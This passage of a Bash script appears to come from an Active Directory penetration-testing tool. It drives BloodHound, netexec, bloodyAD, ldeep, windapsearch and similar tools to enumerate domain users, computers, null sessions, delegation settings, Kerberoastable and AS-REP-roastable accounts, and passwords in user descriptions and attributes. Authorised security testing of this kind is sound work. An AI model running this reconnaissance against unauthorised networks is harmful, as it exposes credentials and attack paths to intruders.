        echo -e "${BLUE}[*] BloodHoundCE Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] BloodHoundCE results found, would you like to run the scan again? (y/N)${NC}"
            bdh_ans="N"
            read -rp ">> " bdh_ans </dev/tty
            if [[ ! "${bdh_ans}" == "y" ]] && [[ ! "${bdh_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
            if [ "${ldap_channel_binding_enforced}" == true ]; then ldap_cb_param="--ldap-channel-binding"; else ldap_cb_param=""; fi
            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldap_cb_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_var}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_var}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

bhdce_enum_dconly() {
    if ! stat "${bloodhoundce}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of BloodHoundCE${NC}"
    else
        mkdir -p "${DomainRecon_dir}/BloodHoundCE_${user_var}"
        echo -e "${BLUE}[*] BloodHoundCE Enumeration using DCOnly${NC}"
        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] BloodHoundCE results found, would you like to run the scan again? (y/N)${NC}"
            bdh_ans="N"
            read -rp ">> " bdh_ans </dev/tty
            if [[ ! "${bdh_ans}" == "y" ]] && [[ ! "${bdh_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
            if [ "${ldap_channel_binding_enforced}" == true ]; then ldap_cb_param="--ldap-channel-binding"; else ldap_cb_param=""; fi
            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldap_cb_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
            cd "${current_dir}" || exit
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_out}_${dc_domain}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

ldapdomaindump_enum() {
    if ! stat "${ldapdomaindump}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    else
        mkdir -p "${DomainRecon_dir}/LDAPDomainDump"
        echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
        if [ -n "$(find "${DomainRecon_dir}/LDAPDomainDump/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] ldapdomaindump results found, would you like to run the scan again? (y/N)${NC}"
            ldd_ans="N"
            read -rp ">> " ldd_ans </dev/tty
            if [[ ! "${ldd_ans}" == "y" ]] && [[ ! "${ldd_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapdomaindump does not support Kerberos authentication ${NC}"
        else
            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="${ldapbindsign_param} ldaps"; else ldaps_param="ldap"; fi
            run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip}:${ldap_port} -o ${DomainRecon_dir}/LDAPDomainDump" | tee "${DomainRecon_dir}/LDAPDomainDump/ldd_output_${dc_domain}.txt"
        fi
        if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" ]; then
            /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" 2>/dev/null > "${Users_dir}/users_list_ldd_${dc_domain}.txt"
        fi
        if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_computers.json" ]; then
            /usr/bin/jq -r ".[].attributes.dNSHostName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_computers.json" 2>/dev/null > "${Servers_dir}/servers_list_ldd_${dc_domain}.txt"
        fi
        parse_users
        parse_servers
    fi
    echo -e ""
}

enum4linux_enum() {
    if ! stat "${enum4linux_py}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] enum4linux does not support Kerberos authentication using AES Key${NC}"
        else
            run_command "${enum4linux_py} -A ${argument_enum4linux} ${target} -oJ ${DomainRecon_dir}/enum4linux_${dc_domain}" >"${DomainRecon_dir}/enum4linux_${dc_domain}.txt"
            head -n 20 "${DomainRecon_dir}/enum4linux_${dc_domain}.txt" 2>&1
            echo -e "............................(truncated output)"
            if [ -s "${DomainRecon_dir}/enum4linux_${dc_domain}.json" ]; then
                /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_enum4linux_${dc_domain}.txt"
            fi
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${CYAN}[*] Guest with empty password (null session)${NC}"
                run_command "${enum4linux_py} -A ${target} -u 'Guest' -p '' -oJ ${DomainRecon_dir}/enum4linux_guest_${dc_domain}" >"${DomainRecon_dir}/enum4linux_guest_${dc_domain}.txt"
                head -n 20 "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.txt" 2>&1
                echo -e "............................(truncated output)"
                if [ -s "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.json" ]; then
                    /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_enum4linux_guest_${dc_domain}.txt"
                fi
            fi
        fi
        parse_users
    fi
    echo -e ""
}

ne_smb_usersenum() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($12, arr, "\\"); print arr[2]}' "${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${Users_dir}/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
    else
        echo -e "${BLUE}[*] Users Enumeration (RPC authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users-export ${Users_dir}/users_list_ne_smb_${dc_domain}.txt --log ${DomainRecon_dir}/ne_users_auth_smb_${dc_domain}.txt" 2>&1
    fi
    parse_users
    echo -e ""
}

ne_passpol() {
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --pass-pol --log ${DomainRecon_dir}/ne_smbpasspol_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ne_ldap_usersenum() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --users --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u Guest -p '' --users --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u ${rand_user} -p '' --users --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        if [ -s "${DomainRecon_dir}/ne_users_nullsess_ldap_${dc_domain}.txt" ]; then
            grep -vE '\[-|\[+|\[\*' "${DomainRecon_dir}/ne_users_nullsess_ldap_${dc_domain}.txt" | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${Users_dir}/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
        fi
    else
        echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --users-export ${Users_dir}/users_list_ne_ldap_${dc_domain}.txt --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
    fi
    parse_users
    echo -e ""
}

ne_ldap_enum() {
    echo -e "${BLUE}[*] DC List Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --dc-list --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_dclist_output_${dc_domain}.txt" 2>&1
    if [ -s "${DomainRecon_dir}/ne_dclist_output_${dc_domain}.txt" ]; then
        grep -vE '\[-|\[\+|\[\*' "${DomainRecon_dir}/ne_dclist_output_${dc_domain}.txt" | grep "=" | grep -oP '\b\S+ = \d{1,3}(\.\d{1,3}){3}\b' | \
        awk -v hostfile="${Servers_dir}/dc_list_ne_ldap_${dc_domain}.txt" -v ipfile="${Servers_dir}/dc_ip_list_ne_ldap_${dc_domain}.txt" -F ' = ' '{print $1 > hostfile; print $2 > ipfile}'
    fi
    parse_servers
    echo -e ""
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --password-not-required --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-desc-users --kdcHost ${dc_FQDN}" >"${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt"
    echo -e ""
    echo -e "${BLUE}[*] Attributes userPassword or unixUserPassword of users ${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-unixUserPassword -M get-userPassword --kdcHost ${dc_FQDN}" >"${DomainRecon_dir}/ne_get-userpass_output_${dc_domain}.txt"
    if [ -s "${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt" ]; then
        grep -i "pass\|pwd\|passwd\|password\|pswd\|pword" "${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt" | tee "${DomainRecon_dir}/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
    fi
    if [ ! -s "${DomainRecon_dir}/ne_get-desc-users_pass_results_${dc_domain}.txt" ] && [ "${noexec_bool}" == "false" ]; then
        echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M maq --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_MachineAccountQuota_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Subnets Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M subnets --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_subnets_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Password Policy${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --pass-pol --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_ldappasspol_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

deleg_enum() {
    if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}" | tee "${DomainRecon_dir}/impacket_findDelegation_output_${dc_domain}.txt"
        if grep -q 'error' "${DomainRecon_dir}/impacket_findDelegation_output_${dc_domain}.txt"; then
            echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
        fi
    fi
    echo -e ""
    echo -e "${BLUE}[*] findDelegation check (netexec)${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --find-delegation --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_find-delegation_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

fqdn_to_ldap_dn() {
    sed -e 's/[^ ]*/DC=&/g' -e 's/ /,/g' <<<"${1//./ }"
}

bloodyad_all_enum() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${DomainRecon_dir}/bloodyAD"
        echo -e "${BLUE}[*] bloodyad All Enumeration${NC}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
            echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_maq_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for users${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype useronly" >"${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt"
            if [ -s "${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt" ]; then
                cut -d ',' -f 1 "${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt" | cut -d '=' -f 2 | sort -u >"${Users_dir}/users_list_bla_${dc_domain}.txt"
            fi
            parse_users
            echo -e "${CYAN}[*] Searching for computers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype computer" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt"
            if [ -s "${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt" ]; then
                cut -d "," -f 1 "${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt" | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_bla_${dc_domain}.txt"
            fi
            parse_servers
            echo -e "${CYAN}[*] Searching for containers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype container" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee "${DomainRecon_dir}/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_asreproast_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

bloodyad_write_enum() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${DomainRecon_dir}/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

bloodyad_dnsquery() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${DomainRecon_dir}/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
            echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
            sed -n '/[^\n]*\*/,/^$/p' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
            grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt" > "${Servers_dir}/servers_ip_list_bloodyad_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

bloodyad_enum_object() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${DomainRecon_dir}/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] List details of object account. Please specify object to enumerate:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
            obj_enum=""
            read -rp ">> " obj_enum </dev/tty
            while [ "${obj_enum}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify object:"
                read -rp ">> " obj_enum </dev/tty
            done
            echo -e "${CYAN}[*] Listing details of object ${obj_enum}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object '${obj_enum}'" 2>&1 | tee -a "${DomainRecon_dir}/bloodyAD/bloodyad_out_${obj_enum}_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

silenthound_enum() {
    if ! stat "${silenthound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
    else
        mkdir -p "${DomainRecon_dir}/SilentHound"
        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
        if [ -n "$(find "${DomainRecon_dir}/SilentHound/" -maxdepth 1 -type f ! -name 'silenthound_output' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] SilentHound results found, would you like to run the scan again? (y/N)${NC}"
            shd_ans="N"
            read -rp ">> " shd_ans </dev/tty
            if [[ ! "${shd_ans}" == "y" ]] && [[ ! "${shd_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] SilentHound does not support Kerberos authentication${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/SilentHound" || exit
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
            run_command "${python3} ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${DomainRecon_dir}/SilentHound/${dc_domain}" >"${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            if [ -s "${DomainRecon_dir}/SilentHound/${dc_domain}-hosts.txt" ]; then
                cut -d " " -f 1 "${DomainRecon_dir}/SilentHound/${dc_domain}-hosts.txt" | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_shd_${dc_domain}.txt"
                cut -d " " -f 2 "${DomainRecon_dir}/SilentHound/${dc_domain}-hosts.txt" >"${Servers_dir}/servers_ip_list_shd_${dc_domain}.txt"
            fi
            if [ -s "${DomainRecon_dir}/SilentHound/${dc_domain}-users.txt" ]; then
                /bin/cp "${DomainRecon_dir}/SilentHound/${dc_domain}-users.txt" "${Users_dir}/users_list_shd_${dc_domain}.txt"
            fi
            if [ -s "${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt" ]; then
                head -n 20 "${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt"
                echo -e "............................(truncated output)"
            fi
        fi
        parse_users
        parse_servers
    fi
    echo -e ""
}

ldeep_enum() {
    if ! stat "${ldeep}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of ldeep${NC}"
    else
        mkdir -p "${DomainRecon_dir}/ldeepDump"
        echo -e "${BLUE}[*] ldeep Enumeration${NC}"
        if [ -n "$(find "${DomainRecon_dir}/ldeepDump/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] ldeep results found, would you like to run the scan again? (y/N)${NC}"
            ldeep_ans="N"
            read -rp ">> " ldeep_ans </dev/tty
            if [[ ! "${ldeep_ans}" == "y" ]] && [[ ! "${ldeep_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
            run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target}:${ldap_port} all ${DomainRecon_dir}/ldeepDump/${dc_domain}" 2>&1 | tee "${DomainRecon_dir}/ldeepDump/ldeep_output_${dc_domain}.txt"
            if [ -s "${DomainRecon_dir}/ldeepDump/${dc_domain}_users_all.lst" ]; then
                /bin/cp "${DomainRecon_dir}/ldeepDump/${dc_domain}_users_all.lst" "${Users_dir}/users_list_ldp_${dc_domain}.txt"
            fi
            if [ -s "${DomainRecon_dir}/ldeepDump/${dc_domain}_computers.lst" ]; then
                /bin/cp "${DomainRecon_dir}/ldeepDump/${dc_domain}_computers.lst" "${Servers_dir}/servers_list_ldp_${dc_domain}.txt"
            fi
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

windapsearch_enum() {
    if ! stat "${windapsearch}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        mkdir -p "${DomainRecon_dir}/windapsearch"
        echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_users_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m computers --full" >"${DomainRecon_dir}/windapsearch/windapsearch_servers_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m groups --full" >"${DomainRecon_dir}/windapsearch/windapsearch_groups_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m privileged-users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_privusers_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'" >"${DomainRecon_dir}/windapsearch/windapsearch_spn_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'" >"${DomainRecon_dir}/windapsearch/windapsearch_managedby_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${Servers_dir}/sql_list_windap_${dc_domain}.txt"
            #Parsing user and computer lists
            grep -a "sAMAccountName:" "${DomainRecon_dir}/windapsearch/windapsearch_users_${dc_domain}.txt" | sed "s/sAMAccountName: //g" | sort -u >"${Users_dir}/users_list_windap_${dc_domain}.txt" 2>&1
